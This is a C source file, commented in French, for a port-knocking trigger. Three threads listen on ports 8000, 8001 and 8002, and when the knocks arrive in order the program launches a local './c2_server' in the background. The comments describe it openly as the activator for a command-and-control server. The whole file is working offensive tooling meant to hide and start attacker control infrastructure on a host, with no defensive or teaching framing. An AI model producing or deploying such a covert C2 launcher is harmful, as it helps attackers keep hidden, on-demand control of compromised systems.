#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

// Ports à frapper dans l'ordre pour activer le serveur
#define KNOCK_PORTS {8000, 8001, 8002}
#define MAX_KNOCKS 3
#define SERVER_PORT 5555 // Port du serveur C2

int knock_sequence[] = KNOCK_PORTS; // Tableau de la séquence de ports
int knock_index = 0;

// Fonction pour surveiller les frappes sur un port donné
void *monitor_port(void *arg) {
    int port = *(int *)arg;
    free(arg);

    int sock, new_sock;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    // socket pour écouter sur le port
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    // Configurer l'adresse et lier le socket au port
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        pthread_exit(NULL);
    }

    listen(sock, 1);

    while (1) {
        // Attendre une connexion sur le port
        new_sock = accept(sock, (struct sockaddr *)&addr, &addr_len);
        if (new_sock < 0) {
            perror("accept");
            continue;
        }

        // Vérifier si la frappe correspond à la séquence
        printf("[Knock] Port frappé : %d\n", port);
        if (port == knock_sequence[knock_index]) {
            knock_index++;
            if (knock_index == MAX_KNOCKS) {
                printf("[Knock] Séquence correcte ! Démarrage du serveur C2...\n");
                system("./c2_server &");
                knock_index = 0;
            }
        } else {
            knock_index = 0; // Réinitialiser si la séquence est incorrecte
        }

        close(new_sock);
    }

    close(sock);
    pthread_exit(NULL);
}

int main() {
    pthread_t threads[MAX_KNOCKS];

    // Créer un thread pour surveiller chaque port
    for (int i = 0; i < MAX_KNOCKS; i++) {
        int *port = malloc(sizeof(int));
        *port = knock_sequence[i];
        if (pthread_create(&threads[i], NULL, monitor_port, port) != 0) {
            perror("pthread_create");
        }
    }

    // Attendre que tous les threads se terminent
    for (int i = 0; i < MAX_KNOCKS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
